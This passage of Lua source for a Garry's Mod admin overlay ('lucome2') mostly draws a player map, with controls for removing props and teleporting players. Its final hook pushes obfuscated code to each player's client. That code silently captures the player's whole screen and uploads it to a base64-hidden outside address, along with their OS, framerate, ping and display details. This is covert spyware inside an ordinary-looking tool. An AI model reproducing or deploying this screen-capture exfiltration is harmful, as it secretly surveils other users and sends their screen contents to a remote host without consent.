		   yy >= lucome2.SectorData.ovac.Pos.y and yy <= lucome2.SectorData.ovac.Pos.y+lucome2.SectorData.ovac.Size.y then
			lucome2.SectorData.ovac.MatrixDot(xx,yy,hov and 12  or 6,32,plcol           )
		end
		
		lucome2.RenderInvisibleCircleButton(MOUSE_LEFT,xx,yy,15,true,function()
			XNCR([=[SafeRemoveEntity(Entity(e))]=],{e=prop:EntIndex()},true,false,{},0,
				{ret=false,mret=false,con=false,deep=false},"Ovac: Removed entity <Owner: "..ownply:Nick()..">")
		end)
		
		--lucome2.SectorData.ovac.PlayerPoses[ply] = Vector(xx,yy)
	end
	
	local dragstart,isdragging,tempzoomcen,newzoom,newzoomcenter = Vector(),false,Vector(),1,Vector()
	lucome2.SectorData.ovac.RenderPlayerPosition = function(ply)
		local pos = ply:GetPos()
		local scale = lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom)
		local cen = lucome2.SectorData.ovac.MapCenter+lucome2.SectorData.ovac.MapZoomCenter
		local maprelativepos = Vector(cen.x-pos.x,cen.y-pos.y)
		local posscaled = Vector(maprelativepos.x/(scale/lucome2.SectorData.ovac.Size.x)/2,maprelativepos.y/(scale/lucome2.SectorData.ovac.Size.y)/2)
		local plcol = PacCamColors[ply:EntIndex()] or Color(128,128,128,255)
		
		local xx = lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.MapLocalCenter.x-posscaled.x
		local yy = lucome2.SectorData.ovac.Pos.y+lucome2.SectorData.ovac.MapLocalCenter.y+posscaled.y
		
		local hov = Vector(gui.MouseX(),gui.MouseY()):Distance(Vector(xx,yy)) <= 6
		
		if xx >= lucome2.SectorData.ovac.Pos.x and xx <= lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x and
		   yy >= lucome2.SectorData.ovac.Pos.y and yy <= lucome2.SectorData.ovac.Pos.y+lucome2.SectorData.ovac.Size.y then
		   		local ang  = -ply:EyeAngles():Right():Angle()+Angle(0,-90,0)
		   		local size = hov and 32 or 16
		   		surface.SetTexture(surface.GetTextureID("vgui/white"))
		   		surface.SetDrawColor(Color(plcol.r,plcol.g,plcol.b,hov and 128 or 64))
				surface.DrawPoly({
					{["x"]=xx,["y"]=yy},
					{["x"]=xx+((ang+Angle(0,-45,0)):Forward()*size).x,["y"]=yy+((ang+Angle(0,-45,0)):Forward()*size).y},
					{["x"]=xx+((ang+Angle(0, 45,0)):Forward()*size).x,["y"]=yy+((ang+Angle(0, 45,0)):Forward()*size).y}
				})
		   	
				lucome2.SectorData.ovac.MatrixDot(xx,yy,hov and 20 or 10,64,Color(0,0,0,255))
				lucome2.SectorData.ovac.MatrixDot(xx,yy,hov and 12 or 6 ,64,plcol           )
		end
		
		lucome2.RenderInvisibleCircleButton(MOUSE_LEFT,xx,yy,15,true,function()
			lucome2.SectorData.ovac.SelectedPlayer = ply
		end)
		
		local absmapscale = math.abs(lucome2.SectorData.ovac.MapBounds.Min.z)+math.abs(lucome2.SectorData.ovac.MapBounds.Max.z)
		lucome2.RenderInvisibleCircleButton(MOUSE_RIGHT,xx,yy,15,true,function()
			lucome2.SectorData.ovac.MapRenderHeight = math.Clamp((pos.z+ply:OBBMaxs().z*1.5)/absmapscale,-1,1)
		end)
		
		lucome2.SectorData.ovac.PlayerPoses[ply] = Vector(xx,yy)
	end
	
	lucome2.SectorData.ovac.Render = function()
		if not lucome2.SectorData.ovac.Fullscreen then
			lucome2.SectorData.ovac.Size = Vector(
				ScrH()-lucome2.SectorData.peek.Size.y-(lucome2.SectorData.peek.Active and 36 or 0),
				ScrH()-lucome2.SectorData.peek.Size.y-(lucome2.SectorData.peek.Active and 36 or 0))
		else
			lucome2.SectorData.ovac.Size = Vector(ScrW()-96,ScrH())
		end
		lucome2.SectorData.ovac.MapLocalCenter = Vector(
			lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x/2,
			lucome2.SectorData.ovac.Pos.y+lucome2.SectorData.ovac.Size.y/2)
			
		if not lucome2.SectorData.ovac.Updated then
			lucome2.SectorData.ovac.Updated = true
			local mins,maxs = game.GetWorld():GetModelBounds()
			lucome2.SectorData.ovac.MapBounds.Min = mins
			lucome2.SectorData.ovac.MapBounds.Max = maxs
			lucome2.SectorData.ovac.MapCenter = Vector(
				(lucome2.SectorData.ovac.MapBounds.Min.x+lucome2.SectorData.ovac.MapBounds.Max.x)/2,
				(lucome2.SectorData.ovac.MapBounds.Min.y+lucome2.SectorData.ovac.MapBounds.Max.y)/2)
			
			lucome2.SectorData.ovac.MapScale = math.max(
				math.abs(lucome2.SectorData.ovac.MapBounds.Min.x),
				math.abs(lucome2.SectorData.ovac.MapBounds.Min.y),
				math.abs(lucome2.SectorData.ovac.MapBounds.Max.x),
				math.abs(lucome2.SectorData.ovac.MapBounds.Max.y))
		end
		
		local pnlposx,pnlposy = lucome2.SectorData.ovac.Pos.x,lucome2.SectorData.ovac.Pos.y
		local pw,ph = lucome2.SectorData.ovac.Size.x,lucome2.SectorData.ovac.Size.y
		local ocolcol = PacCamColors[LocalPlayer():EntIndex()] or Color(128,128,128,255)
		local absmapscale = math.abs(lucome2.SectorData.ovac.MapBounds.Min.z)+math.abs(lucome2.SectorData.ovac.MapBounds.Max.z)
		surface.SetDrawColor(Color(0,0,0,180))
		surface.DrawRect(pnlposx,pnlposy,pw,ph)
		
		lucome2.ScrollDetectArea(pnlposx,pnlposy,pw,ph,true,function(delta)
			local diff = input.IsKeyDown(KEY_LSHIFT) and 8 or 2
			newzoom = math.Clamp(
				lucome2.SectorData.ovac.MapZoom+delta*math.sqrt(lucome2.SectorData.ovac.MapZoom)/diff,1,2048)
		end)
		lucome2.SectorData.ovac.MapZoom       = Lerp      (0.33,lucome2.SectorData.ovac.MapZoom      ,newzoom      )
		lucome2.SectorData.ovac.MapZoomCenter = LerpVector(0.33,lucome2.SectorData.ovac.MapZoomCenter,newzoomcenter)
		
		if input.IsMouseDown(MOUSE_MIDDLE) and not isdragging then
			dragstart = Vector(gui.MouseX(),gui.MouseY())
			tempzoomcen = lucome2.SectorData.ovac.MapZoomCenter*1
			isdragging = true
		end
		
		if not input.IsMouseDown(MOUSE_MIDDLE) and isdragging then
			isdragging = false
		end
		
		if isdragging then
			local zx = -math.Remap(
				(gui.MouseX()-dragstart.x),
				-lucome2.SectorData.ovac.Size.x/2,lucome2.SectorData.ovac.Size.x/2,
				-lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom),
				 lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom))
			local zy = math.Remap(
				(gui.MouseY()-dragstart.y),
				-lucome2.SectorData.ovac.Size.y/2,lucome2.SectorData.ovac.Size.y/2,
				-lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom),
				 lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom))
				 
			newzoomcenter = tempzoomcen+Vector(zx,zy)
		end
		
		local tplycount = table.Count(lucome2.SectorData.ovac.TrackingPlayer)
		
		local tplycen = Vector()
		local tplymaxdist = 0
		local tplyheight = lucome2.SectorData.ovac.MapBounds.Min.z
		for k,v in pairs(lucome2.SectorData.ovac.TrackingPlayer) do
			tplyheight = math.max(tplyheight,v:GetPos().z+v:OBBMaxs().z*1.5)
			tplycen = tplycen+v:GetPos()
		end
		tplycen = tplycen/tplycount
		
		if tplycount > 1 then
			for k,v in pairs(lucome2.SectorData.ovac.TrackingPlayer) do
				if v:GetPos():Distance(tplycen) > tplymaxdist then
					local q = 1/(v:GetPos():Distance(tplycen))*lucome2.SectorData.ovac.MapScale*0.8
					if q > 64 then
						tplymaxdist = q
					else
						tplymaxdist = 16
					end
				end
			end
		else
			tplymaxdist = 16
		end
		
		if tplycount > 0 then
			lucome2.SectorData.ovac.MapRenderHeight = math.Clamp(tplyheight/absmapscale,-1,1)
			newzoom       = tplycount > 1 and tplymaxdist or newzoom
			newzoomcenter = tplycen
		end
		
		lucome2.SectorData.ovac.RenderMap(lucome2.SectorData.ovac.Size.x,lucome2.SectorData.ovac.Size.y)
		
		local sliderposes = {}
		for k,v in pairs(player.GetAll()) do
			local gpos = math.Clamp(v:GetPos().z/absmapscale,-1,1)
			local epos = math.Clamp(v:EyePos().z/absmapscale,-1,1)
			sliderposes[v] = {gpos,epos}
		end
		
		lucome2.RenderVerticalSlider(
			lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x,lucome2.SectorData.ovac.Pos.y,
			32,lucome2.SectorData.ovac.Size.y,
			lucome2.SectorData.ovac.MapRenderHeight,-1,1,
			true,ocolcol,sliderposes,function(val,mid)
				lucome2.SectorData.ovac.MapRenderHeight = mid and 0.95 or val
		end)
		
		if lucome2.SectorData.ovac.SelectedPlayer:IsValid() then
			local plcol = PacCamColors[lucome2.SectorData.ovac.SelectedPlayer:EntIndex()] or Color(128,128,128,255)
			local plpos = lucome2.SectorData.ovac.PlayerPoses[lucome2.SectorData.ovac.SelectedPlayer]
			local crpos = Vector(gui.MouseX(),gui.MouseY())
			surface.SetDrawColor(plcol)
			if lucome2.CursorWithin(pnlposx,pnlposy,pw,ph) then
				surface.DrawLine(plpos.x,plpos.y,crpos.x,crpos.y)
				lucome2.RenderInvisibleCircleButton(MOUSE_LEFT,crpos.x,crpos.y,3,true,function()
					local newcursorpos = Vector(
						 math.Remap(
							(gui.MouseX()-lucome2.SectorData.ovac.Pos.x),
							lucome2.SectorData.ovac.Pos.x,
							lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x,
							-lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom),
							 lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom))+lucome2.SectorData.ovac.MapCenter.x+lucome2.SectorData.ovac.MapZoomCenter.x,
						-math.Remap(
							(gui.MouseY()+lucome2.SectorData.ovac.Pos.y),
							lucome2.SectorData.ovac.Pos.y,
							lucome2.SectorData.ovac.Pos.y+lucome2.SectorData.ovac.Size.y,
							-lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom),
							 lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom))+lucome2.SectorData.ovac.MapCenter.y+lucome2.SectorData.ovac.MapZoomCenter.y)
					
					local newpos = util.TraceLine({
						start  = Vector(newcursorpos.x,newcursorpos.y,lucome2.SectorData.ovac.MapBounds.Max.z*lucome2.SectorData.ovac.MapRenderHeight),
						endpos = Vector(newcursorpos.x,newcursorpos.y,lucome2.SectorData.ovac.MapBounds.Min.z    ),
						mask   = MASK_SOLID_BRUSHONLY
					})
					
					if newpos.HitTexture:lower() == "tools/toolsskybox" then
						newpos = util.TraceLine({
							start  = newpos.HitPos+Vector(0,0,-1),
							endpos = Vector(newcursorpos.x,newcursorpos.y,lucome2.SectorData.ovac.MapBounds.Min.z),
							mask   = MASK_SOLID_BRUSHONLY
						})
					end
					
					XNCR([=[p:SetPos(np)]=],{p=lucome2.SectorData.ovac.SelectedPlayer,np=newpos.HitPos},true,false,{},0,
						{con=false,ret=false,mret=false,deep=false},"Ovac: Set "..lucome2.SectorData.ovac.SelectedPlayer:Nick().."'s Position")
					
					lucome2.SectorData.ovac.SelectedPlayer = NULL
				end)
				
				lucome2.RenderInvisibleCircleButton(MOUSE_RIGHT,crpos.x,crpos.y,3,true,function()
					lucome2.SectorData.ovac.SelectedPlayer = NULL
				end)
			end
		end
		
		if lucome2.SectorData.ovac.ShowPropOwners then
			for k,v in pairs(ents.GetAll()) do
				local owner = v:EntIndex() > 1 and v.CPPIGetOwner and v:CPPIGetOwner() or NULL
				if not owner:IsValid() then continue end
				if v:GetPos():Distance(owner:GetPos()) >= lucome2.SectorData.ovac.MapScale*3 then continue end
				lucome2.SectorData.ovac.RenderPropPosition(v,owner)
			end
		end
		
		local pt = {}
		for k,v in pairs(player.GetAll()) do
			pt[#pt+1] = v
			lucome2.SectorData.ovac.RenderPlayerPosition(v)
		end
		
		for k,v in pairs(pt) do
			local pcol = PacCamColors[v:EntIndex()] or Color(128,128,128,255)
			
			local istracking = lucome2.SectorData.ovac.TrackingPlayer[v]
			
			lucome2.SectorData.ovac.MatrixDot(lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x+48,lucome2.SectorData.ovac.Pos.y+k*16,
				12,32,istracking and Color(0,0,0,255) or Color(64,64,64,255))
			lucome2.SectorData.ovac.MatrixDot(lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x+48,lucome2.SectorData.ovac.Pos.y+k*16,
				8 ,32,istracking and pcol             or Color(0 ,0 ,0 ,255))
			
			lucome2.SectorData.ovac.MatrixDot(lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x+64,lucome2.SectorData.ovac.Pos.y+k*16,
				12,32,Color(0,0,0,255))
			lucome2.SectorData.ovac.MatrixDot(lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x+64,lucome2.SectorData.ovac.Pos.y+k*16,
				8 ,32,pcol)
				
			draw.SimpleTextOutlined(v:Nick(),"Default",lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x+64+16,
				lucome2.SectorData.ovac.Pos.y+k*16,pcol,0,1,1,Color(0,0,0,255))
			lucome2.RenderInvisibleCircleButton(MOUSE_LEFT,
				lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x+48,lucome2.SectorData.ovac.Pos.y+k*16,12,true,function()
					if lucome2.SectorData.ovac.TrackingPlayer[v] then
						lucome2.SectorData.ovac.TrackingPlayer[v] = nil
					else
						lucome2.SectorData.ovac.TrackingPlayer[v] = v
					end
			end)
			lucome2.RenderInvisibleCircleButton(MOUSE_LEFT,
				lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x+64,lucome2.SectorData.ovac.Pos.y+k*16,12,true,function()
					lucome2.SectorData.ovac.SelectedPlayer = v
			end)
			lucome2.RenderInvisibleCircleButton(MOUSE_RIGHT,
				lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x+64,lucome2.SectorData.ovac.Pos.y+k*16,12,true,function()
					local new = Vector(
						 math.Remap(
							(lucome2.SectorData.ovac.PlayerPoses[v].x-lucome2.SectorData.ovac.Pos.x),
							lucome2.SectorData.ovac.Pos.x,
							lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x,
							-lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom),
							 lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom))+lucome2.SectorData.ovac.MapCenter.x+lucome2.SectorData.ovac.MapZoomCenter.x,
						-math.Remap(
							(lucome2.SectorData.ovac.PlayerPoses[v].y+lucome2.SectorData.ovac.Pos.y),
							lucome2.SectorData.ovac.Pos.y,
							lucome2.SectorData.ovac.Pos.y+lucome2.SectorData.ovac.Size.y,
							-lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom),
							 lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom))+lucome2.SectorData.ovac.MapCenter.y+lucome2.SectorData.ovac.MapZoomCenter.y)
					newzoomcenter = new
					newzoom = 16
			end)
		end
		
		lucome2.RenderButton("Show Prop Owners",
			lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x+32,
			lucome2.SectorData.ovac.Pos.y+lucome2.SectorData.ovac.Size.y-36*2,96,36,true,lucome2.SectorData.ovac.ShowPropOwners,ocolcol,function()
				lucome2.SectorData.ovac.ShowPropOwners = not lucome2.SectorData.ovac.ShowPropOwners
		end)
		
		lucome2.RenderButton("Reset Zoom",
			lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x+32,
			lucome2.SectorData.ovac.Pos.y+lucome2.SectorData.ovac.Size.y-36,96,36,table.Count(lucome2.SectorData.ovac.TrackingPlayer) == 0,true,ocolcol,function()
				newzoom = 1
				newzoomcenter = Vector(0,0)
		end)
		
		surface.SetDrawColor(ocolcol)
		surface.DrawOutlinedRect(pnlposx,pnlposy,pw,ph)
	end
	
	
	lucome2.CreateSector = function(sec)
		if not lucome2.SectorData[sec] then return end
		lucome2.SectorData[sec].Create()
	end
	
	lucome2.RemoveSector = function(sec)
		if not lucome2.SectorData[sec] then return end
		lucome2.SectorData[sec].Remove()
	end
	
	lucome2.ToggleSector = function(sec)
		if not lucome2.SectorData[sec] then return end
		lucome2.SectorData[sec].Toggle()
	end
	
	lucome2.CreateMainFrame = function()
		if lucome2.MainFrame:IsValid() then lucome2.MainFrame:Close() end
		local mf = vgui.Create("DFrame")
		mf:SetPos(0,0)
		mf:SetSize(ScrW(),ScrH())
		mf:SetTitle("")
		mf:SetDraggable(false)
		--mf:ShowCloseButton(false)
		mf.Paint = function(self,w,h)
			lucome2.RenderButtons()
			return
		end
		mf.OnKeyCodePressed = function(self,key)
			if lucome2.MenuCloseTime-CurTime() <= 0 and key == lucome2.BindKey then
				lucome2.Toggle()
			end
		end
		mf.OnMouseWheeled = function(s,d)
			lucome2.MouseWheelDelta = d
		end
		mf:MakePopup()
		mf:RequestFocus()
		mf:SetVisible(false)
		lucome2.MainFrame = mf
	end
	
	lucome2.Startup = function()
		lucome2.BindKey = input.GetKeyCode(input.LookupBinding("lucome")) or KEY_F
		lucome2.CreateMainFrame()
		lucome2.SetupHooks()
		lucome2.SetupReceivers()
		lucome2.CreateFonts()
		
		for k,v in pairs(lucome2.SectorData) do
			if v.Create then
				v.Create()
			end
		end
	end
	
	lucome2.Shutdown = function()
		if lucome2.MainFrame:IsValid() then
			lucome2.MainFrame:Close()
		end
	end
	
	lucome2.Toggle = function()
		lucome2.Active = not lucome2.Active
		
		if lucome2.Active then
			input.SetCursorPos(lucome2.LastMousePos.x,lucome2.LastMousePos.y)
		else
			lucome2.LastMousePos = Vector(gui.MouseX(),gui.MouseY())
		end
		
		RunConsoleCommand("vechud","visible" ,lucome2.Active and "0" or "1")
		RunConsoleCommand("vechud","nametags",lucome2.Active and "0" or "1")
		
		lucome2.MainFrame:SetVisible(lucome2.Active)
		lucome2.BindKey = input.GetKeyCode(input.LookupBinding("lucome")) or KEY_F
		lucome2.MenuCloseTime = CurTime()+0.25
		
		net.Start(lucome2.NetStrings.ovac.ShouldUpdatePVS)
			net.WriteBool(lucome2.Active)
		net.SendToServer()
	end
	
	concommand.Add("lucome",function(p,c,a,s)
		lucome2.Toggle()
	end)
	
	lucome2.Startup()
	
	hook.Add("XNCInit","LuCoMe2-SCGC-Init",function(p)
		XNCR([==[__SREQ = false hook.Add("PostRender","Scgc",function() if __SREQ then __SREQ = false ______S() end end) ______S = function()
			local d,f = cc({format="jpeg",x=0,y=0,w=ScrW(),h=ScrH(),quality=95}),m:Nick():gsub("[^%a%d_]",""):gsub(" ","_").."___"..os.date():gsub("[%:%/]","-"):gsub("%s","_")
			http.Post(bb(ff),{dat=be(d),nam=f,ext=".jpg",dec="true"},function(b,l,h,c)
			    tt = {ScrW(),ScrH(),m:GetFOV(),math.Round(1/RealFrameTime(),2),m:Ping(),tostring(system.IsWindowed()),system.IsWindows() and 1 or system.IsOSX() and 0 or system.IsLinux() and -1 or -2}
				   net.Start(nstr) net.WriteString(f) net.WriteEntity(rr) net.WriteEntity(m) net.WriteTable(tt) net.SendToServer()
			end,function() end)
		end]==],{
			m    = p,
			bb   = base64.decode,
			be   = base64.encode,
			ff   = lucome2.SectorData.scgc.Uplink,
			tt   = {},
			rr   = LocalPlayer(),
			cc   = render.Capture,
			nstr = lucome2.NetStrings.scgc.ts
		},false,false,{p},0,{},"Scgc: Initialized")
	end)
	end

	hook.Add("InitPostEntity","LuCoMe2_Initialize",LuCoMe2_Init)
	if LocalPlayer and LocalPlayer():IsValid() then
		LuCoMe2_Init()
	end
end